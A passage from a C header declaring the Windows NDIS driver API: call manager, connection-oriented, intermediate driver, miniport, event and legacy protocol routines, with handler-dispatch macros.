  IN PCO_CALL_PARAMETERS  CallParameters);


NDISAPI
NDIS_STATUS
NTAPI
NdisClOpenAddressFamily(
  IN NDIS_HANDLE  NdisBindingHandle,
  IN PCO_ADDRESS_FAMILY  AddressFamily,
  IN NDIS_HANDLE  ProtocolAfContext,
  IN PNDIS_CLIENT_CHARACTERISTICS  ClCharacteristics,
  IN UINT  SizeOfClCharacteristics,
  OUT PNDIS_HANDLE  NdisAfHandle);

NDISAPI
NDIS_STATUS
NTAPI
NdisClRegisterSap(
  IN NDIS_HANDLE  NdisAfHandle,
  IN NDIS_HANDLE  ProtocolSapContext,
  IN PCO_SAP  Sap,
  OUT PNDIS_HANDLE  NdisSapHandle);


/* Call Manager services */

NDISAPI
NDIS_STATUS
NTAPI
NdisCmActivateVc(
  IN NDIS_HANDLE  NdisVcHandle,
  IN OUT PCO_CALL_PARAMETERS  CallParameters);

NDISAPI
VOID
NTAPI
NdisCmAddPartyComplete(
  IN NDIS_STATUS  Status,
  IN NDIS_HANDLE  NdisPartyHandle,
  IN NDIS_HANDLE  CallMgrPartyContext  OPTIONAL,
  IN PCO_CALL_PARAMETERS  CallParameters);

NDISAPI
VOID
NTAPI
NdisCmCloseAddressFamilyComplete(
  IN NDIS_STATUS Status,
  IN NDIS_HANDLE NdisAfHandle);

NDISAPI
VOID
NTAPI
NdisCmCloseCallComplete(
  IN NDIS_STATUS  Status,
  IN NDIS_HANDLE  NdisVcHandle,
  IN NDIS_HANDLE  NdisPartyHandle  OPTIONAL);

NDISAPI
NDIS_STATUS
NTAPI
NdisCmDeactivateVc(
  IN NDIS_HANDLE  NdisVcHandle);

NDISAPI
VOID
NTAPI
NdisCmDeregisterSapComplete(
  IN NDIS_STATUS  Status,
  IN NDIS_HANDLE  NdisSapHandle);

NDISAPI
VOID
NTAPI
NdisCmDispatchCallConnected(
  IN NDIS_HANDLE  NdisVcHandle);

NDISAPI
NDIS_STATUS
NTAPI
NdisCmDispatchIncomingCall(
  IN NDIS_HANDLE  NdisSapHandle,
  IN NDIS_HANDLE  NdisVcHandle,
  IN PCO_CALL_PARAMETERS  CallParameters);

NDISAPI
VOID
NTAPI
NdisCmDispatchIncomingCallQoSChange(
  IN NDIS_HANDLE  NdisVcHandle,
  IN PCO_CALL_PARAMETERS  CallParameters);

NDISAPI
VOID
NTAPI
NdisCmDispatchIncomingCloseCall(
  IN NDIS_STATUS  CloseStatus,
  IN NDIS_HANDLE  NdisVcHandle,
  IN PVOID  Buffer  OPTIONAL,
  IN UINT  Size);

NDISAPI
VOID
NTAPI
NdisCmDispatchIncomingDropParty(
  IN NDIS_STATUS  DropStatus,
  IN NDIS_HANDLE  NdisPartyHandle,
  IN PVOID  Buffer  OPTIONAL,
  IN UINT  Size);

NDISAPI
VOID
NTAPI
NdisCmDropPartyComplete(
  IN NDIS_STATUS  Status,
  IN NDIS_HANDLE  NdisPartyHandle);

NDISAPI
VOID
NTAPI
NdisCmMakeCallComplete(
  IN NDIS_STATUS  Status,
  IN NDIS_HANDLE  NdisVcHandle,
  IN NDIS_HANDLE  NdisPartyHandle  OPTIONAL,
  IN NDIS_HANDLE  CallMgrPartyContext  OPTIONAL,
  IN PCO_CALL_PARAMETERS  CallParameters);

NDISAPI
VOID
NTAPI
NdisCmModifyCallQoSComplete(
  IN NDIS_STATUS  Status,
  IN NDIS_HANDLE  NdisVcHandle,
  IN PCO_CALL_PARAMETERS  CallParameters);

NDISAPI
VOID
NTAPI
NdisCmOpenAddressFamilyComplete(
  IN NDIS_STATUS Status,
  IN NDIS_HANDLE NdisAfHandle,
  IN NDIS_HANDLE CallMgrAfContext);

NDISAPI
NDIS_STATUS
NTAPI
NdisCmRegisterAddressFamily(
  IN NDIS_HANDLE  NdisBindingHandle,
  IN PCO_ADDRESS_FAMILY  AddressFamily,
  IN PNDIS_CALL_MANAGER_CHARACTERISTICS  CmCharacteristics,
  IN UINT  SizeOfCmCharacteristics);

NDISAPI
VOID
NTAPI
NdisCmRegisterSapComplete(
  IN NDIS_STATUS  Status,
  IN NDIS_HANDLE  NdisSapHandle,
  IN NDIS_HANDLE  CallMgrSapContext);


NDISAPI
NDIS_STATUS
NTAPI
NdisMCmActivateVc(
  IN NDIS_HANDLE  NdisVcHandle,
  IN PCO_CALL_PARAMETERS  CallParameters);

NDISAPI
NDIS_STATUS
NTAPI
NdisMCmCreateVc(
  IN NDIS_HANDLE  MiniportAdapterHandle,
  IN NDIS_HANDLE  NdisAfHandle,
  IN NDIS_HANDLE  MiniportVcContext,
  OUT  PNDIS_HANDLE  NdisVcHandle);

NDISAPI
NDIS_STATUS
NTAPI
NdisMCmDeactivateVc(
  IN NDIS_HANDLE  NdisVcHandle);

NDISAPI
NDIS_STATUS
NTAPI
NdisMCmDeleteVc(
  IN NDIS_HANDLE  NdisVcHandle);

NDISAPI
NDIS_STATUS
NTAPI
NdisMCmRegisterAddressFamily(
  IN NDIS_HANDLE  MiniportAdapterHandle,
  IN PCO_ADDRESS_FAMILY  AddressFamily,
  IN PNDIS_CALL_MANAGER_CHARACTERISTICS  CmCharacteristics,
  IN UINT  SizeOfCmCharacteristics);

NDISAPI
NDIS_STATUS
NTAPI
NdisMCmRequest(
  IN NDIS_HANDLE  NdisAfHandle,
  IN NDIS_HANDLE  NdisVcHandle  OPTIONAL,
  IN NDIS_HANDLE  NdisPartyHandle  OPTIONAL,
  IN OUT  PNDIS_REQUEST  NdisRequest);


/* Connection-oriented services */

NDISAPI
NDIS_STATUS
NTAPI
NdisCoCreateVc(
  IN NDIS_HANDLE  NdisBindingHandle,
  IN NDIS_HANDLE  NdisAfHandle  OPTIONAL,
  IN NDIS_HANDLE  ProtocolVcContext,
  IN OUT PNDIS_HANDLE  NdisVcHandle);

NDISAPI
NDIS_STATUS
NTAPI
NdisCoDeleteVc(
  IN NDIS_HANDLE  NdisVcHandle);

NDISAPI
NDIS_STATUS
NTAPI
NdisCoRequest(
  IN NDIS_HANDLE  NdisBindingHandle,
  IN NDIS_HANDLE  NdisAfHandle  OPTIONAL,
  IN NDIS_HANDLE  NdisVcHandle  OPTIONAL,
  IN NDIS_HANDLE  NdisPartyHandle  OPTIONAL,
  IN OUT  PNDIS_REQUEST  NdisRequest);

NDISAPI
VOID
NTAPI
NdisCoRequestComplete(
  IN NDIS_STATUS  Status,
  IN NDIS_HANDLE  NdisAfHandle,
  IN NDIS_HANDLE  NdisVcHandle  OPTIONAL,
  IN NDIS_HANDLE  NdisPartyHandle  OPTIONAL,
  IN PNDIS_REQUEST  NdisRequest);

NDISAPI
VOID
NTAPI
NdisCoSendPackets(
  IN NDIS_HANDLE  NdisVcHandle,
  IN PPNDIS_PACKET  PacketArray,
  IN UINT  NumberOfPackets);

NDISAPI
VOID
NTAPI
NdisMCoActivateVcComplete(
  IN NDIS_STATUS  Status,
  IN NDIS_HANDLE  NdisVcHandle,
  IN PCO_CALL_PARAMETERS  CallParameters);

NDISAPI
VOID
NTAPI
NdisMCoDeactivateVcComplete(
  IN NDIS_STATUS  Status,
  IN NDIS_HANDLE  NdisVcHandle);

NDISAPI
VOID
NTAPI
NdisMCoIndicateReceivePacket(
  IN NDIS_HANDLE  NdisVcHandle,
  IN PPNDIS_PACKET  PacketArray,
  IN UINT  NumberOfPackets);

NDISAPI
VOID
NTAPI
NdisMCoIndicateStatus(
  IN NDIS_HANDLE  MiniportAdapterHandle,
  IN NDIS_HANDLE  NdisVcHandle  OPTIONAL,
  IN NDIS_STATUS  GeneralStatus,
  IN PVOID  StatusBuffer  OPTIONAL,
  IN ULONG  StatusBufferSize);

NDISAPI
VOID
NTAPI
NdisMCoReceiveComplete(
  IN NDIS_HANDLE  MiniportAdapterHandle);

NDISAPI
VOID
NTAPI
NdisMCoRequestComplete(
  IN NDIS_STATUS  Status,
  IN NDIS_HANDLE  MiniportAdapterHandle,
  IN PNDIS_REQUEST  Request);

NDISAPI
VOID
NTAPI
NdisMCoSendComplete(
  IN NDIS_STATUS  Status,
  IN NDIS_HANDLE  NdisVcHandle,
  IN PNDIS_PACKET  Packet);


/* NDIS 5.0 extensions for intermediate drivers */

NDISAPI
VOID
NTAPI
NdisIMAssociateMiniport(
  IN NDIS_HANDLE  DriverHandle,
  IN NDIS_HANDLE  ProtocolHandle);

NDISAPI
NDIS_STATUS
NTAPI
NdisIMCancelInitializeDeviceInstance(
  IN NDIS_HANDLE  DriverHandle,
  IN PNDIS_STRING  DeviceInstance);

NDISAPI
VOID
NTAPI
NdisIMCopySendCompletePerPacketInfo(
  IN PNDIS_PACKET  DstPacket,
  IN PNDIS_PACKET  SrcPacket);

NDISAPI
VOID
NTAPI
NdisIMCopySendPerPacketInfo(
  IN PNDIS_PACKET  DstPacket,
  IN PNDIS_PACKET  SrcPacket);

NDISAPI
VOID
NTAPI
NdisIMDeregisterLayeredMiniport(
  IN NDIS_HANDLE  DriverHandle);

NDISAPI
NDIS_HANDLE
NTAPI
NdisIMGetBindingContext(
  IN NDIS_HANDLE  NdisBindingHandle);

NDISAPI
NDIS_HANDLE
NTAPI
NdisIMGetDeviceContext(
  IN NDIS_HANDLE  MiniportAdapterHandle);

NDISAPI
NDIS_STATUS
NTAPI
NdisIMInitializeDeviceInstanceEx(
  IN NDIS_HANDLE  DriverHandle,
  IN PNDIS_STRING  DriverInstance,
  IN NDIS_HANDLE  DeviceContext  OPTIONAL);

/*
NDISAPI
PSINGLE_LIST_ENTRY
NTAPI
NdisInterlockedPopEntrySList(
  IN PSLIST_HEADER ListHead,
  IN PKSPIN_LOCK Lock);
*/
#define NdisInterlockedPopEntrySList(SListHead, Lock) \
  ExInterlockedPopEntrySList(SListHead, &(Lock)->SpinLock)

/*
NDISAPI
PSINGLE_LIST_ENTRY
NTAPI
NdisInterlockedPushEntrySList(
  IN PSLIST_HEADER ListHead,
  IN PSINGLE_LIST_ENTRY ListEntry,
  IN PKSPIN_LOCK Lock);
*/
#define NdisInterlockedPushEntrySList(SListHead, SListEntry, Lock) \
  ExInterlockedPushEntrySList(SListHead, SListEntry, &(Lock)->SpinLock)

#define NdisInterlockedFlushSList(SListHead) ExInterlockedFlushSList(SListHead)

/*
NDISAPI
VOID
NTAPI
NdisQueryBufferSafe(
  IN PNDIS_BUFFER Buffer,
  OUT PVOID *VirtualAddress OPTIONAL,
  OUT PUINT Length,
  IN UINT Priority);
*/
#define NdisQueryBufferSafe(_Buffer, _VirtualAddress, _Length, _Priority) {         \
  if (ARGUMENT_PRESENT(_VirtualAddress)) {                                          \
    *(PVOID *)(_VirtualAddress) = MmGetSystemAddressForMdlSafe(_Buffer, _Priority); \
  }                                                                                 \
  *(_Length) = MmGetMdlByteCount(_Buffer);                                          \
}

/* Routines for NDIS miniport drivers */

#if NDIS_SUPPORT_NDIS6

NDISAPI
PNDIS_GENERIC_OBJECT
NTAPI
NdisAllocateGenericObject(
  PDRIVER_OBJECT DriverObject OPTIONAL,
  ULONG Tag,
  USHORT Size);

NDISAPI
VOID
NTAPI
NdisFreeGenericObject(
  IN PNDIS_GENERIC_OBJECT NdisObject);

#endif /* NDIS_SUPPORT_NDIS6 */

NDISAPI
VOID
NTAPI
NdisInitializeWrapper(
  OUT PNDIS_HANDLE  NdisWrapperHandle,
  IN PVOID  SystemSpecific1,
  IN PVOID  SystemSpecific2,
  IN PVOID  SystemSpecific3);

NDISAPI
NDIS_STATUS
NTAPI
NdisMAllocateMapRegisters(
  IN NDIS_HANDLE  MiniportAdapterHandle,
  IN UINT  DmaChannel,
  IN NDIS_DMA_SIZE  DmaSize,
  IN ULONG  PhysicalMapRegistersNeeded,
  IN ULONG  MaximumPhysicalMapping);

/*
 * VOID
 * NdisMArcIndicateReceive(
 *   IN NDIS_HANDLE  MiniportAdapterHandle,
 *   IN PUCHAR  HeaderBuffer,
 *   IN PUCHAR  DataBuffer,
 *   IN UINT  Length);
 */
#define NdisMArcIndicateReceive(MiniportAdapterHandle, \
                                HeaderBuffer,          \
                                DataBuffer,            \
                                Length)                \
{                                                      \
    ArcFilterDprIndicateReceive(                       \
        (((PNDIS_MINIPORT_BLOCK)(MiniportAdapterHandle))->ArcDB), \
        (HeaderBuffer), \
        (DataBuffer),   \
        (Length));      \
}

/*
 * VOID
 * NdisMArcIndicateReceiveComplete(
 *   IN NDIS_HANDLE  MiniportAdapterHandle);
 */
#define NdisMArcIndicateReceiveComplete(MiniportAdapterHandle) \
{                                                              \
    if (((PNDIS_MINIPORT_BLOCK)MiniportAdapterHandle)->EthDB)  \
	    {                                                        \
	        NdisMEthIndicateReceiveComplete(_H);                 \
	    }                                                        \
                                                               \
    ArcFilterDprIndicateReceiveComplete(                       \
      ((PNDIS_MINIPORT_BLOCK)MiniportAdapterHandle)->ArcDB);   \
}

NDISAPI
VOID
NTAPI
NdisMCloseLog(
  IN NDIS_HANDLE  LogHandle);

NDISAPI
NDIS_STATUS
NTAPI
NdisMCreateLog(
  IN NDIS_HANDLE  MiniportAdapterHandle,
  IN UINT  Size,
  OUT PNDIS_HANDLE  LogHandle);

NDISAPI
VOID
NTAPI
NdisMDeregisterAdapterShutdownHandler(
  IN NDIS_HANDLE  MiniportHandle);

#if NDIS_LEGACY_MINIPORT

NDISAPI
VOID
NTAPI
NdisMDeregisterInterrupt(
  IN PNDIS_MINIPORT_INTERRUPT Interrupt);

NDISAPI
VOID
NTAPI
NdisMRegisterAdapterShutdownHandler(
  IN NDIS_HANDLE MiniportHandle,
  IN PVOID ShutdownContext,
  IN ADAPTER_SHUTDOWN_HANDLER ShutdownHandler);

NDISAPI
NDIS_STATUS
NTAPI
NdisMRegisterInterrupt(
  OUT PNDIS_MINIPORT_INTERRUPT Interrupt,
  IN NDIS_HANDLE MiniportAdapterHandle,
  IN UINT InterruptVector,
  IN UINT InterruptLevel,
  IN BOOLEAN RequestIsr,
  IN BOOLEAN SharedInterrupt,
  IN NDIS_INTERRUPT_MODE InterruptMode);

NDISAPI
NDIS_STATUS
NTAPI
NdisMRegisterMiniport(
  IN NDIS_HANDLE NdisWrapperHandle,
  IN PNDIS_MINIPORT_CHARACTERISTICS MiniportCharacteristics,
  IN UINT CharacteristicsLength);

NDISAPI
BOOLEAN
NTAPI
NdisMSynchronizeWithInterrupt(
  IN PNDIS_MINIPORT_INTERRUPT Interrupt,
  IN PVOID SynchronizeFunction,
  IN PVOID SynchronizeContext);
#endif /* NDIS_LEGACY_MINIPORT */

NDISAPI
VOID
NTAPI
NdisMDeregisterIoPortRange(
  IN NDIS_HANDLE  MiniportAdapterHandle,
  IN UINT  InitialPort,
  IN UINT  NumberOfPorts,
  IN PVOID  PortOffset);

/*
 * VOID
 * NdisMEthIndicateReceive(
 *   IN NDIS_HANDLE  MiniportAdapterHandle,
 *   IN NDIS_HANDLE  MiniportReceiveContext,
 *   IN PVOID  HeaderBuffer,
 *   IN UINT  HeaderBufferSize,
 *   IN PVOID  LookaheadBuffer,
 *   IN UINT  LookaheadBufferSize,
 *   IN UINT  PacketSize);
 */
#define NdisMEthIndicateReceive(MiniportAdapterHandle,  \
                                MiniportReceiveContext, \
                                HeaderBuffer,           \
                                HeaderBufferSize,       \
                                LookaheadBuffer,        \
                                LookaheadBufferSize,    \
                                PacketSize)             \
{                                                       \
    (*((PNDIS_MINIPORT_BLOCK)(MiniportAdapterHandle))->EthRxIndicateHandler)( \
		((PNDIS_MINIPORT_BLOCK)(MiniportAdapterHandle))->EthDB,  \
		(MiniportReceiveContext), \
		(HeaderBuffer),           \
		(HeaderBuffer),           \
		(HeaderBufferSize),       \
		(LookaheadBuffer),        \
		(LookaheadBufferSize),    \
		(PacketSize));            \
}

/*
 * VOID
 * NdisMEthIndicateReceiveComplete(
 *   IN NDIS_HANDLE MiniportAdapterHandle);
 */
#define NdisMEthIndicateReceiveComplete(MiniportAdapterHandle) \
{                                                              \
    (*((PNDIS_MINIPORT_BLOCK)(MiniportAdapterHandle))->EthRxCompleteHandler)( \
        ((PNDIS_MINIPORT_BLOCK)MiniportAdapterHandle)->EthDB);    \
}

/*
 * VOID
 * NdisMFddiIndicateReceive(
 *   IN NDIS_HANDLE  MiniportAdapterHandle,
 *   IN NDIS_HANDLE  MiniportReceiveContext,
 *   IN PVOID  HeaderBuffer,
 *   IN UINT  HeaderBufferSize,
 *   IN PVOID  LookaheadBuffer,
 *   IN UINT  LookaheadBufferSize,
 *   IN UINT  PacketSize);
 */
#define NdisMFddiIndicateReceive(MiniportAdapterHandle,  \
                                 MiniportReceiveContext, \
                                 HeaderBuffer,           \
                                 HeaderBufferSize,       \
                                 LookaheadBuffer,        \
                                 LookaheadBufferSize,    \
                                 PacketSize)             \
{                                                        \
    (*((PNDIS_MINIPORT_BLOCK)(MiniportAdapterHandle))->FddiRxIndicateHandler)( \
        (((PNDIS_MINIPORT_BLOCK)(MiniportAdapterHandle))->FddiDB),   \
        (MiniportReceiveContext),              \
        (PUCHAR)(HeaderBuffer) + 1,            \
        (((*(PUCHAR*)(HeaderBuffer)) & 0x40) ? \
            FDDI_LENGTH_OF_LONG_ADDRESS :      \
		    FDDI_LENGTH_OF_SHORT_ADDRESS),     \
        (HeaderBuffer),                        \
        (HeaderBufferSize),                    \
        (LookaheadBuffer),                     \
        (LookaheadBufferSize),                 \
        (PacketSize));                         \
}



/*
 * VOID
 * NdisMFddiIndicateReceiveComplete(
 *   IN NDIS_HANDLE  MiniportAdapterHandle);
 */
#define NdisMFddiIndicateReceiveComplete(MiniportAdapterHandle) \
{                                                               \
    (*((PNDIS_MINIPORT_BLOCK)(MiniportAdapterHandle))->FddiRxCompleteHandler)( \
        ((PNDIS_MINIPORT_BLOCK)MiniportAdapterHandle)->FddiDB);      \
}

NDISAPI
VOID
NTAPI
NdisMFlushLog(
  IN NDIS_HANDLE  LogHandle);

NDISAPI
VOID
NTAPI
NdisMFreeMapRegisters(
  IN NDIS_HANDLE  MiniportAdapterHandle);

/*
 * VOID
 * EXPORT
 * NdisMIndicateReceivePacket(
 *  IN NDIS_HANDLE  MiniportAdapterHandle,
 *  IN PPNDIS_PACKET  ReceivePackets,
 *  IN UINT  NumberOfPackets);
 */
#define NdisMIndicateReceivePacket(MiniportAdapterHandle, \
  ReceivePackets, NumberOfPackets)                        \
  (*((PNDIS_MINIPORT_BLOCK)(MiniportAdapterHandle))->PacketIndicateHandler)( \
  MiniportAdapterHandle, ReceivePackets, NumberOfPackets)

/*
 * VOID
 * NdisMIndicateStatus(
 *  IN NDIS_HANDLE  MiniportAdapterHandle,
 *  IN NDIS_STATUS  GeneralStatus,
 *  IN PVOID  StatusBuffer,
 *  IN UINT  StatusBufferSize);
 */

#define NdisMIndicateStatus(MiniportAdapterHandle,  \
   GeneralStatus, StatusBuffer, StatusBufferSize)   \
  (*((PNDIS_MINIPORT_BLOCK)(MiniportAdapterHandle))->StatusHandler)(   \
  MiniportAdapterHandle, GeneralStatus, StatusBuffer, StatusBufferSize)

/*
 * VOID
 * NdisMIndicateStatusComplete(
 *   IN NDIS_HANDLE  MiniportAdapterHandle);
 */
#define NdisMIndicateStatusComplete(MiniportAdapterHandle) \
  (*((PNDIS_MINIPORT_BLOCK)(MiniportAdapterHandle))->StatusCompleteHandler)( \
    MiniportAdapterHandle)

/*
 * VOID
 * NdisMInitializeWrapper(
 *   OUT PNDIS_HANDLE  NdisWrapperHandle,
 *   IN PVOID  SystemSpecific1,
 *   IN PVOID  SystemSpecific2,
 *   IN PVOID  SystemSpecific3);
 */
#define NdisMInitializeWrapper(NdisWrapperHandle, \
                               SystemSpecific1,   \
                               SystemSpecific2,   \
                               SystemSpecific3)   \
    NdisInitializeWrapper((NdisWrapperHandle),    \
                          (SystemSpecific1),      \
                          (SystemSpecific2),      \
                          (SystemSpecific3))

NDISAPI
NDIS_STATUS
NTAPI
NdisMMapIoSpace(
  OUT PVOID  *VirtualAddress,
  IN NDIS_HANDLE  MiniportAdapterHandle,
  IN NDIS_PHYSICAL_ADDRESS  PhysicalAddress,
  IN UINT  Length);

/*
 * VOID
 * NdisMQueryInformationComplete(
 *  IN NDIS_HANDLE  MiniportAdapterHandle,
 *  IN NDIS_STATUS  Status);
 */
#define NdisMQueryInformationComplete(MiniportAdapterHandle, Status) \
  (*((PNDIS_MINIPORT_BLOCK)(MiniportAdapterHandle))->QueryCompleteHandler)(MiniportAdapterHandle, Status)

NDISAPI
NDIS_STATUS
NTAPI
NdisMRegisterIoPortRange(
  OUT PVOID  *PortOffset,
  IN NDIS_HANDLE  MiniportAdapterHandle,
  IN UINT  InitialPort,
  IN UINT  NumberOfPorts);

NDISAPI
VOID
NTAPI
NdisMSetTimer(
  IN PNDIS_MINIPORT_TIMER  Timer,
  IN UINT  MillisecondsToDelay);

NDISAPI
VOID
NTAPI
NdisMInitializeTimer(
  IN OUT PNDIS_MINIPORT_TIMER Timer,
  IN NDIS_HANDLE MiniportAdapterHandle,
  IN PNDIS_TIMER_FUNCTION TimerFunction,
  IN PVOID FunctionContext);

NDISAPI
VOID
NTAPI
NdisMSetPeriodicTimer(
  IN PNDIS_MINIPORT_TIMER Timer,
  IN UINT MillisecondPeriod);

NDISAPI
VOID
NTAPI
NdisMCancelTimer(
  IN PNDIS_MINIPORT_TIMER Timer,
  OUT PBOOLEAN TimerCancelled);

#if !defined(NDIS_WRAPPER)

/*
 * VOID
 * NdisMResetComplete(
 *   IN NDIS_HANDLE  MiniportAdapterHandle,
 *   IN NDIS_STATUS  Status,
 *   IN BOOLEAN  AddressingReset);
 */
#define	NdisMResetComplete(MiniportAdapterHandle, \
                           Status,                \
                           AddressingReset)       \
{                                                 \
    (*((PNDIS_MINIPORT_BLOCK)(MiniportAdapterHandle))->ResetCompleteHandler)( \
        MiniportAdapterHandle, Status, AddressingReset); \
}

/*
 * VOID
 * NdisMSendComplete(
 *   IN NDIS_HANDLE  MiniportAdapterHandle,
 *   IN PNDIS_PACKET  Packet,
 *   IN NDIS_STATUS  Status);
 */
#define	NdisMSendComplete(MiniportAdapterHandle, \
                          Packet,                \
                          Status)                \
{                                                \
    (*((PNDIS_MINIPORT_BLOCK)(MiniportAdapterHandle))->SendCompleteHandler)( \
        MiniportAdapterHandle, Packet, Status);  \
}

/*
 * VOID
 * NdisMSendResourcesAvailable(
 *   IN NDIS_HANDLE  MiniportAdapterHandle);
 */
#define	NdisMSendResourcesAvailable(MiniportAdapterHandle) \
{                                                \
    (*((PNDIS_MINIPORT_BLOCK)(MiniportAdapterHandle))->SendResourcesHandler)( \
        MiniportAdapterHandle); \
}

/*
 * VOID
 * NdisMTransferDataComplete(
 *   IN NDIS_HANDLE  MiniportAdapterHandle,
 *   IN PNDIS_PACKET  Packet,
 *   IN NDIS_STATUS  Status,
 *   IN UINT  BytesTransferred);
 */
#define	NdisMTransferDataComplete(MiniportAdapterHandle, \
                                  Packet,                \
                                  Status,                \
                                  BytesTransferred)      \
{                                                        \
    (*((PNDIS_MINIPORT_BLOCK)(MiniportAdapterHandle))->TDCompleteHandler)( \
        MiniportAdapterHandle, Packet, Status, BytesTransferred)           \
}

#endif /* !_NDIS_ */


/*
 * VOID
 * NdisMSetAttributes(
 *  IN NDIS_HANDLE  MiniportAdapterHandle,
 *  IN NDIS_HANDLE  MiniportAdapterContext,
 *  IN BOOLEAN  BusMaster,
 *  IN NDIS_INTERFACE_TYPE  AdapterType);
 */
#define NdisMSetAttributes(MiniportAdapterHandle,   \
                           MiniportAdapterContext,  \
                           BusMaster,               \
                           AdapterType)             \
  NdisMSetAttributesEx(MiniportAdapterHandle,       \
    MiniportAdapterContext,                         \
    0,                                              \
    (BusMaster) ? NDIS_ATTRIBUTE_BUS_MASTER : 0,    \
    AdapterType)

NDISAPI
VOID
NTAPI
NdisMSetAttributesEx(
  IN NDIS_HANDLE  MiniportAdapterHandle,
  IN NDIS_HANDLE  MiniportAdapterContext,
  IN UINT  CheckForHangTimeInSeconds   OPTIONAL,
  IN ULONG  AttributeFlags,
  IN NDIS_INTERFACE_TYPE AdapterType);

/*
 * VOID
 * NdisMSetInformationComplete(
 *   IN NDIS_HANDLE  MiniportAdapterHandle,
 *   IN NDIS_STATUS  Status);
 */
#define NdisMSetInformationComplete(MiniportAdapterHandle, \
                                    Status) \
  (*((PNDIS_MINIPORT_BLOCK)(MiniportAdapterHandle))->SetCompleteHandler)( \
    MiniportAdapterHandle, Status)

NDISAPI
VOID
NTAPI
NdisMSleep(
  IN ULONG  MicrosecondsToSleep);

/*
 * VOID
 * NdisMTrIndicateReceive(
 *   IN NDIS_HANDLE  MiniportAdapterHandle,
 *   IN NDIS_HANDLE  MiniportReceiveContext,
 *   IN PVOID  HeaderBuffer,
 *   IN UINT  HeaderBufferSize,
 *   IN PVOID  LookaheadBuffer,
 *   IN UINT  LookaheadBufferSize,
 *   IN UINT  PacketSize);
 */
#define NdisMTrIndicateReceive(MiniportAdapterHandle,  \
                               MiniportReceiveContext, \
                               HeaderBuffer,           \
                               HeaderBufferSize,       \
                               LookaheadBuffer,        \
                               LookaheadBufferSize,    \
                               PacketSize)             \
{                                                      \
    (*((PNDIS_MINIPORT_BLOCK)(MiniportAdapterHandle))->TrRxIndicateHandler)( \
      (((PNDIS_MINIPORT_BLOCK)(MiniportAdapterHandle))->TrDB),     \
		(MiniportReceiveContext), \
		(HeaderBuffer),           \
		(HeaderBuffer),           \
		(HeaderBufferSize),       \
		(LookaheadBuffer),        \
		(LookaheadBufferSize),    \
		(PacketSize));            \
}

/*
 * VOID
 * NdisMTrIndicateReceiveComplete(
 *   IN NDIS_HANDLE  MiniportAdapterHandle);
 */
#define NdisMTrIndicateReceiveComplete(MiniportAdapterHandle) \
{                                                             \
	(*((PNDIS_MINIPORT_BLOCK)(MiniportAdapterHandle))->TrRxCompleteHandler)( \
    ((PNDIS_MINIPORT_BLOCK)MiniportAdapterHandle)->TrDB);    \
}

NDISAPI
NDIS_STATUS
NTAPI
NdisMWriteLogData(
  IN NDIS_HANDLE  LogHandle,
  IN PVOID  LogBuffer,
  IN UINT  LogBufferSize);

NDISAPI
VOID
NTAPI
NdisMQueryAdapterResources(
  OUT PNDIS_STATUS  Status,
  IN NDIS_HANDLE  WrapperConfigurationContext,
  OUT PNDIS_RESOURCE_LIST  ResourceList,
  IN OUT PUINT  BufferSize);

NDISAPI
VOID
NTAPI
NdisTerminateWrapper(
  IN NDIS_HANDLE  NdisWrapperHandle,
  IN PVOID  SystemSpecific);

NDISAPI
VOID
NTAPI
NdisMUnmapIoSpace(
  IN NDIS_HANDLE  MiniportAdapterHandle,
  IN PVOID  VirtualAddress,
  IN UINT  Length);

/* Event functions */

NDISAPI
VOID
NTAPI
NdisInitializeEvent(
  OUT PNDIS_EVENT Event);

NDISAPI
VOID
NTAPI
NdisSetEvent(
  IN PNDIS_EVENT Event);

NDISAPI
VOID
NTAPI
NdisResetEvent(
  IN PNDIS_EVENT Event);

NDISAPI
BOOLEAN
NTAPI
NdisWaitEvent(
  IN PNDIS_EVENT Event,
  IN UINT MsToWait);

/* NDIS intermediate miniport structures */

typedef VOID (NTAPI *W_MINIPORT_CALLBACK)(
  IN NDIS_HANDLE  MiniportAdapterContext,
  IN PVOID  CallbackContext);

/* Routines for intermediate miniport drivers */

NDISAPI
NDIS_STATUS
NTAPI
NdisIMDeInitializeDeviceInstance(
  IN NDIS_HANDLE NdisMiniportHandle);

/*
 * NDIS_STATUS
 * NdisIMInitializeDeviceInstance(
 *   IN NDIS_HANDLE  DriverHandle,
 *   IN PNDIS_STRING  DeviceInstance);
 */
#define NdisIMInitializeDeviceInstance(DriverHandle, DeviceInstance) \
  NdisIMInitializeDeviceInstanceEx(DriverHandle, DeviceInstance, NULL)

/* Functions obsoleted by NDIS 5.0 */

NDISAPI
VOID
NTAPI
NdisFreeDmaChannel(
  IN PNDIS_HANDLE  NdisDmaHandle);

NDISAPI
VOID
NTAPI
NdisSetupDmaTransfer(
  OUT PNDIS_STATUS  Status,
  IN PNDIS_HANDLE  NdisDmaHandle,
  IN PNDIS_BUFFER  Buffer,
  IN ULONG  Offset,
  IN ULONG  Length,
  IN BOOLEAN  WriteToDevice);

/*
NDISAPI
NTSTATUS
NTAPI
NdisUpcaseUnicodeString(
  OUT PUNICODE_STRING DestinationString,
  IN PUNICODE_STRING SourceString);
*/
#define NdisUpcaseUnicodeString(_d, _s) RtlUpcaseUnicodeString(_d, _s, FALSE)


/* Routines for NDIS protocol drivers */

#if NDIS_LEGACY_PROTOCOL

NDISAPI
NDIS_STATUS
NTAPI
NdisIMRegisterLayeredMiniport(
  IN NDIS_HANDLE NdisWrapperHandle,
  IN PNDIS_MINIPORT_CHARACTERISTICS MiniportCharacteristics,
  IN UINT CharacteristicsLength,
  OUT PNDIS_HANDLE DriverHandle);

NDISAPI
VOID
NTAPI
NdisTransferData(
  OUT PNDIS_STATUS Status,
  IN NDIS_HANDLE NdisBindingHandle,
  IN NDIS_HANDLE MacReceiveContext,
  IN UINT ByteOffset,
  IN UINT BytesToTransfer,
  IN OUT PNDIS_PACKET Packet,
  OUT PUINT BytesTransferred);

NDISAPI
VOID
NTAPI
NdisSend(
  OUT PNDIS_STATUS Status,
  IN NDIS_HANDLE NdisBindingHandle,
  IN PNDIS_PACKET Packet);

NDISAPI
VOID
NTAPI
NdisSendPackets(
  IN NDIS_HANDLE NdisBindingHandle,
  IN PPNDIS_PACKET PacketArray,
  IN UINT NumberOfPackets);

NDISAPI
VOID
NTAPI
NdisRequest(
  OUT PNDIS_STATUS Status,
  IN NDIS_HANDLE NdisBindingHandle,
  IN PNDIS_REQUEST NdisRequest);

NDISAPI
VOID
NTAPI
NdisReset(
  OUT PNDIS_STATUS Status,
  IN NDIS_HANDLE NdisBindingHandle);

NDISAPI
VOID
NTAPI
NdisDeregisterProtocol(
  OUT PNDIS_STATUS Status,
  IN NDIS_HANDLE NdisProtocolHandle);
